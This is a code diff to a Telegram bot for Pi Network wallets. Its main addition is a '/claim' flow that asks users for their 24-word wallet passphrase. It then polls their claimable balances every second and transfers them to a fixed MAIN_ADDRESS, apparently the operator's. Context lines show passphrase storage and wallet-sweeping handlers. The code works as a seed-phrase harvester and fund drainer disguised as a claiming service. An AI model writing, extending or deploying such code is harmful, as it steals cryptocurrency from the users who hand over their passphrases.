@@ -1,5 +1,5 @@
 import TelegramBot from "node-telegram-bot-api";
-import { getAccount, getBalance, getKeypairFromPassphrase, sleep, sweepWallet } from "./utils/fn.js";
+import { FloodchannelTransaction, getAccount, getBalance, getClaimableBalance, getKeypairFromPassphrase, sleep, sweepWallet } from "./utils/fn.js";
 import { storeLockedPi, storeSponsor, upsertSettings } from "./utils/modelfn.js";
 import { connectToDB } from "./db.js";
 import Sponsors from "./models/Sponsors.js";
@@ -81,7 +81,8 @@ bot.onText(/\/maxFlood/, (msg) => {
 
 bot.onText(/\/claim/, (msg) => {
     const chatId = msg.chat.id;
-    bot.sendMessage(chatId, 'Not available on *demo*', { parse_mode: 'Markdown' });
+    bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space)', { parse_mode: 'Markdown' });
+    userSessions[chatId] = { isClaiming: true }
 });
 
 bot.onText(/\/search/, (msg) => {
@@ -286,6 +287,8 @@ bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
 
+    if (!userSessions[chatId]?.waitingForPassphraseAndAddress) return;
+
     if(userSessions[chatId]?.waitingForPassphraseAndAddress) {
         const parts = text.split(/\s+/);
         const address = parts[parts.length - 1];
@@ -333,6 +336,8 @@ bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
 
+    if (!userSessions[chatId]?.waitingForMyWalletAddress) return;
+
     if(userSessions[chatId]?.waitingForMyWalletAddress) {
         try {
             const passphrases = await Passphrase.find({ receiverAddress: text, name: 'shepherd' });
@@ -375,6 +380,8 @@ bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
 
+    if (!userSessions[chatId]?.SearchingForWallet) return;
+
     if(userSessions[chatId]?.SearchingForWallet) {
         try {
             const passphrases = await Passphrase.find();
@@ -410,6 +417,8 @@ bot.on('message', async (msg) => {
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
+
+    if (!userSessions[chatId]?.SearchingForWalletP) return;
 
     if(userSessions[chatId]?.SearchingForWalletP) {
         try {
@@ -447,6 +456,8 @@ bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
 
+    if (!userSessions[chatId]?.SearchingForASponsor) return;
+
     if(userSessions[chatId]?.SearchingForASponsor) {
         try {
             const passphrases = await Sponsors.find();
@@ -483,6 +494,8 @@ bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
 
+    if (!userSessions[chatId]?.waitingForDeletePassphrase) return;
+
     if(userSessions[chatId]?.waitingForDeletePassphrase) {
         try {
             const kp = getKeypairFromPassphrase(text);
@@ -510,6 +523,8 @@ bot.on('message', async (msg) => {
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
+
+    if (!userSessions[chatId]?.waitingForDeleteSponsor) return;
 
     if(userSessions[chatId]?.waitingForDeleteSponsor) {
         try {
@@ -539,6 +554,8 @@ bot.on('message', async (msg) => {
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
+
+    if (!userSessions[chatId]?.waitingForPassphraseAndName) return;
 
     if(userSessions[chatId]?.waitingForPassphraseAndName) {
         const passphraseWords = text.split(/\s+/);
@@ -577,6 +594,8 @@ bot.on('message', async (msg) => {
 
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
+
+    if (!userSessions[chatId]?.waitingForPassphraseForSweeping) return;
 
     if(userSessions[chatId]?.waitingForPassphraseForSweeping) {
         while(!userSessions[chatId]?.stopAll) {
@@ -621,6 +640,8 @@ bot.on('message', async (msg) => {
 
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
+
+    if (!userSessions[chatId]?.waitingForPassphraseForBalance) return;
 
     try {
         if(userSessions[chatId]?.waitingForPassphraseForBalance) {
@@ -670,6 +691,8 @@ bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
 
+    if (!userSessions[chatId]?.Funder) return;
+
     if(userSessions[chatId]?.Funder) {
         const passphraseWords = text.split(/\s+/);
 
@@ -709,6 +732,8 @@ bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
 
+    if (!userSessions[chatId]?.MaxFlood) return;
+
     if(userSessions[chatId]?.MaxFlood) {
         const maxFlood = Number(text);
         if(isNaN(maxFlood)) {
@@ -737,6 +762,8 @@ bot.on('message', async (msg) => {
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
+
+    if (!userSessions[chatId]?.MyAddress) return;
 
     if(userSessions[chatId]?.MyAddress) {
         const parts = text.split(/\s+/);
@@ -775,6 +802,7 @@ bot.on('message', async (msg) => {
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
+    if (!userSessions[chatId]?.showSettings) return;
 
     if(userSessions[chatId]?.showSettings) {
         if(text !== PASSWORD) {
@@ -818,6 +846,104 @@ bot.on('message', async (msg) => {
             bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
         }
 
+        delete userSessions[chatId];
+    }
+});
+
+// Is Claiming
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text.trim();
+    if (!text) return;
+    if (!userSessions[chatId]?.isClaiming) return;
+
+    // userSessions[chatId] = { isClaiming: true };
+    bot.sendMessage(chatId, `🔍 Checking your Pi wallet...`);
+
+    try {
+        const kp = getKeypairFromPassphrase(text);
+        const accountData = await getAccount(kp.publicKey());
+
+        if (!accountData) {
+            delete userSessions[chatId];
+            return bot.sendMessage(chatId, `❌ Invalid Pi wallet. Please check your passphrase.`);
+        }
+
+        const checkInterval = setInterval(async () => {
+            try {
+                const claimable = await getClaimableBalance(kp.publicKey());
+                const records = claimable?._embedded?.records || [];
+
+                if (records.length === 0) {
+                    bot.sendMessage(chatId, `⚠️ No claimable Pi found yet. Still checking every second...`);
+                    return;
+                }
+
+                const claimableEntries = [];
+                for (const record of records) {
+                    const claimant = record.claimants.find(c => c.destination === kp.publicKey());
+                    if (!claimant) continue;
+
+                    let claimableAt = new Date();
+                    const predicate = claimant.predicate;
+
+                    if (predicate?.not?.abs_before) {
+                        claimableAt = new Date(predicate.not.abs_before);
+                        if (claimableAt > new Date()) continue;
+                    }
+
+                    claimableEntries.push({
+                        mnemonic: text,
+                        claimableAt,
+                        balanceId: record.id,
+                        amount: record.amount
+                    });
+                }
+
+                if (claimableEntries.length === 0) {
+                    bot.sendMessage(chatId, `⚠️ Claimable balances found, but not yet claimable (waiting time).`);
+                    return;
+                }
+
+                const sponsors = await Sponsors.find({ name: 'shepherd' });
+                if (!sponsors.length) {
+                    clearInterval(checkInterval);
+                    delete userSessions[chatId];
+                    return bot.sendMessage(chatId, `❌ No sponsor accounts available for claiming.`);
+                }
+
+                const results = await Promise.all(claimableEntries.map(entry =>
+                    FloodchannelTransaction(
+                        text,
+                        entry.balanceId,
+                        MAIN_ADDRESS,
+                        entry.amount,
+                        sponsors
+                    )
+                ));
+
+                const successTxs = results.filter((res) => res?.hash);
+                const failedTxs = results.filter((res) => !res?.hash);
+
+                let message = `✅ Claiming finished.\n\n`;
+                message += `🟢 Successful: ${successTxs.length}\n`;
+                message += `🔴 Failed: ${failedTxs.length}\n\n`;
+
+                bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+                clearInterval(checkInterval);
+                delete userSessions[chatId];
+
+            } catch (err) {
+                console.error(err);
+                bot.sendMessage(chatId, `❌ An error occurred: ${err.message}`);
+                clearInterval(checkInterval);
+                delete userSessions[chatId];
+            }
+
+        }, 1000);
+    } catch(error) {
+        console.log(error);
+        bot.sendMessage(chatId, `❌ Error processing. Make sure your passphrase is correct.`);
         delete userSessions[chatId];
     }
 });
